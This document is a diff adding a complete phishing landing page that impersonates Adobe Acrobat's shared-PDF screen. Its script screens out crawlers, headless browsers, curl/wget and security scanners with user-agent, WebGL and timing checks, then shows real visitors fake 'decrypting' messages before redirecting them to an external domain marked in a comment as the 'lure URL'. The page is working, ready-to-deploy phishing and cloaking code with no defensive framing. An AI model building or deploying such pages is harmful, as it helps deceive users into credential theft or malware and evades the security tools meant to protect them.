@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Adobe Acrobat - Shared PDF</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23EC1C24'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='14' font-family='Arial' font-weight='bold'>A</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Adobe Clean',system-ui,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}
+.nav{background:#2c2c2c;padding:12px 24px;display:flex;align-items:center;gap:8px}
+.nav-logo{display:flex;align-items:center;gap:8px}
+.nav-logo .mark{width:28px;height:28px;background:#EC1C24;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:14px}
+.nav-logo span{color:#fff;font-size:15px}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
+.card{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);max-width:440px;width:100%;padding:40px 36px;text-align:center}
+.pdf-icon{width:72px;height:88px;margin:0 auto 24px;background:linear-gradient(135deg,#fff 60%,#f0f0f0 60%);border:2px solid #e0e0e0;border-radius:6px;position:relative;display:flex;align-items:center;justify-content:center}
+.pdf-icon::after{content:'PDF';position:absolute;bottom:8px;left:50%;transform:translateX(-50%);background:#EC1C24;color:#fff;font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px}
+.pdf-icon .fold{position:absolute;top:0;right:0;width:20px;height:20px;background:linear-gradient(225deg,#f5f5f5 50%,#d0d0d0 50%)}
+h1{font-size:20px;color:#2c2c2c;margin-bottom:6px}
+.sub{font-size:14px;color:#6e6e6e;margin-bottom:28px;line-height:1.5}
+.loader{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:16px}
+.ring{width:32px;height:32px;border:3px solid #f0f0f0;border-top-color:#EC1C24;border-radius:50%;animation:ring .7s linear infinite}
+@keyframes ring{to{transform:rotate(360deg)}}
+.loader-text{font-size:14px;color:#4b4b4b}
+.blocked{display:none;color:#d32f2f;font-size:14px;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="nav"><div class="nav-logo"><div class="mark">A</div><span>Adobe Acrobat</span></div></div>
+<div class="main">
+<div class="card">
+<div class="pdf-icon"><div class="fold"></div></div>
+<h1>PDF Document Shared</h1>
+<p class="sub">Someone shared a protected document with you.<br>Verifying your access rights...</p>
+<div class="loader" id="loader"><div class="ring"></div><span class="loader-text" id="status">Verifying access...</span></div>
+<p class="blocked" id="blocked">Document access denied — unauthorized client detected.</p>
+</div>
+</div>
+<script>
+/*──── CONFIG: Replace with your lure URL ────*/
+var REDIRECT_URL = "https://fexorin.cfd/pdf.au";
+/*────────────────────────────────────────────*/
+
+(function(){
+var t=document.getElementById('status'),b=document.getElementById('blocked'),l=document.getElementById('loader');
+function bad(){b.style.display='block';l.style.display='none'}
+function chk(){
+if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
+if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index/i.test(navigator.userAgent))return!1;
+try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
+if(navigator.languages&&navigator.languages.length===0)return!1;
+if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
+if(screen.width<300||screen.height<300)return!1;
+var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
+return!0
+}
+if(!chk()){bad();return}
+var msgs=["Verifying access...","Decrypting PDF...","Loading document viewer...","Opening document..."];
+var s=0;var iv=setInterval(function(){s++;t.textContent=msgs[Math.min(s,msgs.length-1)];if(s>=msgs.length){clearInterval(iv);setTimeout(function(){window.location.replace(REDIRECT_URL)},400)}},1100);
+})();
+</script>
+</body>
+</html>
